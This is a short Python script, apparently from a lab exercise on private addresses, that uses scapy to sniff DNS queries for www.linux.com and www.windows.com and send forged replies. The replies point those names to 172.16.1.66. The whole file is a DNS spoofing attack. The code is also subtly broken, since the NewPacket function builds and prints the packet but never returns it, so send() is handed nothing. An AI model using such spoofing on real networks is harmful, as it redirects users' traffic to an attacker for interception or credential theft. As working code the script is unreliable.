#!/usr/bin/python
from scapy.all import *

#idDNS = 30000

def dnsMonitorCallBack(pkt):
    if pkt.haslayer(DNS):
        if pkt[DNS][DNSQR].qname == b'www.linux.com.':
            print("packet LINUX received")
            packet = NewPacket(pkt)
            send(packet)
        if pkt[DNS][DNSQR].qname == b'www.windows.com.':
            print("packet WINDOWS received")
            packet = NewPacket(pkt)
            send(packet)

def NewPacket(pkt):
    #global idDNS
    packet = IP(src="172.16.1.66", dst=pkt[IP].src) / \
             UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
             DNS(id=pkt[DNS].id,qr=1,rd=1,ra=1, qd=DNSQR(qname=pkt[DNS][DNSQR].qname,qtype=pkt[DNS][DNSQR].qtype,qclass=pkt[DNS][DNSQR].qclass), an=DNSRR(rrname=pkt[DNS][DNSQR].qname, type="A", rclass="IN", ttl=267, rdata="172.16.1.66"))
    packet.show()
    #idDNS += 1

sniff(prn=dnsMonitorCallBack)